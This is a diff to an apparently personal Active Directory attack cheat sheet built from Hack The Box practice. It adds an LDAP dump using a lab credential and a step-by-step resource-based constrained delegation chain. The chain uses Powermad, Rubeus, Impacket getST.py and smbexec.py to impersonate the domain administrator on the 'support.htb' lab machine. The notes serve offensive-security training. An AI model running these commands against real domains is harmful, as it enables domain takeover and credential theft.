@@ -3,6 +3,7 @@
 ## Notes
 * Good Theory around AD: [zer1t0](https://zer1t0.gitlab.io/posts/attacking_ad/)
 * Attack Methods Summary: [m0chan](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
+* HackTricks: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
 
 
 
@@ -157,6 +158,15 @@ For more details see: https://docs.microsoft.com/en-us/troubleshoot/windows-serv
 
 `ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"`
 
+## Domain info dump with ldap
+```
+ ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
+
+ldapsearch -x -H ldap://dc.support.htb -D 'SUPPORT\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=SUPPORT,DC=HTB" | tee ldap_dc.support.htb.txt
+
+ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
+```
+
 ## Sniffing using Bloodhound
 
 Actual collectors: https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
@@ -242,6 +252,61 @@ Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/
 
 * RPC: `evil-winrm -i 10.10.10.xxx -u 'xxx'  -p 'xxx' `
 * SMB: use some exploit from SMB cheat sheet
+
+
+## Generic All
+
+If some user or group has "Generic All" Permission on any of the other objects than this object can be easily compromised.
+
+Tools needed:
+
+* powermad
+* Rubeus
+
+
+```
+# -------- On Server Side
+# Upload tools
+upload /home/user/Tools/Powermad/Powermad.ps1 pm.ps1
+upload /home/user/Tools/Ghostpack-CompiledBinaries/Rubeus.exe r.exe
+
+# Import PowerMad
+Import-Module ./pm.ps1
+
+# Set variables
+Set-Variable -Name "FakePC" -Value "FAKE01"
+Set-Variable -Name "targetComputer" -Value "DC"
+
+# With Powermad, Add the new fake computer object to AD.
+New-MachineAccount -MachineAccount (Get-Variable -Name "FakePC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+
+# With Built-in AD modules, give the new fake computer object the Constrained Delegation privilege.
+Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')
+
+# With Built-in AD modules, check that the last command worked.
+Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties PrincipalsAllowedToDelegateToAccount
+
+
+# With Rubeus, generate the new fake computer object password hashes. 
+#  Since we created the computer object with the password 123456 we will need those hashes
+#  for the next step.
+./Rubeus.exe hash /password:123456 /user:FAKE01$ /domain:support.htb
+
+# -------- On Attck Box Side.
+# Using getTGT from Impacket, generate a ccached TGT and used KERB5CCNAME pass the ccahe file for the requested service. 
+#   If you are getting errors, "cd ~/impacket/", "python3 -m pip install ."
+/home/user/Tools/impacket/examples/getST.py support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B
+
+# Set local variable of KERB5CCNAME to pass the ccahe TGT file for the requested service.
+export KRB5CCNAME=administrator.ccache
+
+# Use smbexec.py to connect with the TGT we just made to the server as the user administrator 
+#  over SMB protocol.
+smbexec.py support.htb/administrator@dc.support.htb -no-pass -k
+
+```
+source> https://cybergladius.com/htb-walkthrough-support/
+
 
 ## Dsync Attack
 Read about dsync here: https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync
